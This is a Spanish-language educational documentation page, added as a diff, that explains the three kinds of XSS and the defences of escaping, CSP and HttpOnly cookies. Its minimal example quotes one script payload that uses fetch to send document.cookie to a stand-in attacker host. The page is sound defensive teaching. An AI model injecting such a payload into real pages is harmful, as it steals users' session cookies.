@@ -1,0 +1,45 @@
+---
+title: XSS
+description: Cómo un atacante logra que un script se ejecute en el navegador de otro usuario bajo el origen de un sitio de confianza — las tres variedades principales, y qué las detiene realmente.
+category: Security
+weight: 6
+interactive: true
+interactiveType: ["ItemExplorer"]
+---
+
+**Cross-Site Scripting (XSS)** ocurre cuando un atacante logra que su propio JavaScript se ejecute dentro de una página bajo un origen *distinto y de confianza* — lo que significa que ese script corre con el mismo acceso a cookies, DOM y llamadas de API que tendría un script legítimo de esa página. No es un bug del navegador; es un fallo en mantener los datos no confiables separados de ser interpretados como código.
+
+## Tres variedades
+
+<ItemExplorer
+  title="Tipos de XSS"
+  layout="table"
+  tableColumns={[{ key: "mechanism", label: "Mecanismo" }]}
+  items={[
+    { id: "stored", label: "Almacenado", color: "red", columns: { mechanism: "La entrada maliciosa se guarda del lado del servidor (un comentario, un campo de perfil) y se sirve de vuelta a cada usuario que ve esa página — la variedad más peligrosa, ya que un solo punto de inyección compromete a muchas víctimas." } },
+    { id: "reflected", label: "Reflejado", color: "orange", columns: { mechanism: "La entrada maliciosa proviene de la propia solicitud (un parámetro de consulta) y se refleja directamente de vuelta en la respuesta — requiere engañar a una víctima para que haga clic en un enlace manipulado." } },
+    { id: "dom-based", label: "Basado en DOM", color: "purple", columns: { mechanism: "El código vulnerable nunca toca el servidor en absoluto — JavaScript del lado del cliente lee algo controlado por el atacante (como location.hash) y lo escribe de forma insegura en el DOM." } },
+  ]}
+/>
+
+## Un ejemplo mínimo
+
+Si una página renderiza un comentario así sin escaparlo:
+
+```html
+<div>{{ comment }}</div>
+```
+
+y un comentario contiene `<script>fetch('https://evil.example/steal?c='+document.cookie)</script>`, cada visitante que ve ese comentario ejecuta el script del atacante — bajo el propio origen del sitio, con acceso a las cookies de ese sitio (a menos que [`HttpOnly`](/es/security/sessions) esté activado).
+
+## Qué lo detiene realmente
+
+- **Escapar la salida** — codificar los datos controlados por el usuario antes de insertarlos en HTML, de modo que `<script>` se convierta en texto literal (`&lt;script&gt;`) en vez de una etiqueta. La mayoría de los frameworks modernos (React, Vue) hacen esto por defecto, razón por la cual eludirlo manualmente (`dangerouslySetInnerHTML`, `v-html`) merece escrutinio extra.
+- **Content Security Policy** — incluso si un marcado malicioso logra pasar, una [CSP](/es/security/content-security-policy) estricta puede bloquear por completo la ejecución de scripts en línea.
+- **Cookies `HttpOnly`** — no impiden que el script se ejecute, pero sí impiden que pueda leer las cookies de sesión aunque llegue a ejecutarse.
+
+## Ver también
+
+- **[Content Security Policy](/es/security/content-security-policy)** — una capa de defensa en profundidad contra exactamente esto.
+- **[Sesiones](/es/security/sessions)** — por qué `HttpOnly` en una cookie de sesión importa específicamente por causa de XSS.
+- **[CSRF](/es/security/csrf)** — un ataque distinto que no requiere inyectar ningún script en absoluto.
